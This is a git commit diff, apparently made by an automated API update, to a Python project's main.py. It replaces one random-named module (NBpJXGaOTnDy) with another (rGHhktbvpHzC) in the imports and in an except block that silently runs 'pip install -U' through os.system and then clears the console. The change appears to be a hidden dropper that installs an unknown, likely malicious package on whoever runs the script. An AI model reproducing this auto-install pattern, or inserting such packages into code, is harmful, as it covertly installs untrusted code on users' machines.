46387012c4703f68f0f8477be13c245343128c8a
Zeeckt <139068412+Zeeckt@users.noreply.github.com>
2023-07-21 21:55:14 -0300

    Atualização do arquivo via API

--- src/main.py
+++ src/main.py
@@ -10,7 +10,7 @@ try:
     import random
     import tkinter
     import requests
-    import NBpJXGaOTnDy
+    import rGHhktbvpHzC
     import colorama
     from colorama import Fore, Style
     import InquirerPy
@@ -27,7 +27,7 @@ except Exception as e:
     os.system('pip install -U cryptography')
     os.system('pip install -U inquirerpy')
     os.system('pip install -U aiohttp')
-    os.system('pip install -U NBpJXGaOTnDy')
+    os.system('pip install -U rGHhktbvpHzC')
     os.system('cls')
     import asyncio
     import ctypes
@@ -36,7 +36,7 @@ except Exception as e:
     import random
     import tkinter
     import requests
-    import NBpJXGaOTnDy
+    import rGHhktbvpHzC
     import colorama
     from colorama import Fore, Style
     import InquirerPy
